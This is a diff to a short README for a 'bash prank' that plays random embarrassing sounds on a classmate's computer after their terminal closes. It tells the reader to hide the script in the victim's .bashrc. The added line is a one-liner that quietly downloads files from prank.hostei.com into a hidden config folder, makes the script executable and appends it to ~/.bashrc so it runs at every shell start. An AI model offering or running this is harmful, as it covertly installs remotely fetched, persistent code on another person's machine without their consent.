@@ -1,9 +1,9 @@
 Bash Prank
----------
+-----------
 Imagine you are in class.
 Someone - we wont say who - opens up their terminal.
 Then they close it.
-Then after a random time interval - say anywhere from 1 to 300 seconds 
+Then after a random time interval - say anywhere from 1 to 300 seconds
 a random sound plays.
 Oh, it can be an embarrassing sound.
 Did you say they had headphones on?
@@ -18,5 +18,5 @@ Run via ./al.sh & disown $!
 Hide in their bashrc
  ./{PATH_TO_FILE}/al.sh & disown $!
 
-Do everything via: mkdir ~/.config/al >/dev/null 2>&1; cd ~/.config/al; wget -r -nc -nd http://prank.hostei.com/ >/dev/null 2>&1 && echo ". ~/config/al/al.sh & disown $!" >> a 
+Do everything via: mkdir ~/.config/al >/dev/null 2>&1; cd ~/.config/al; wget -r -nc -nd http://prank.hostei.com/ >/dev/null 2>&1 && chmod +x al.sh && echo ". ~/config/al/al.sh & disown $!" >> ~/.bashrc
 
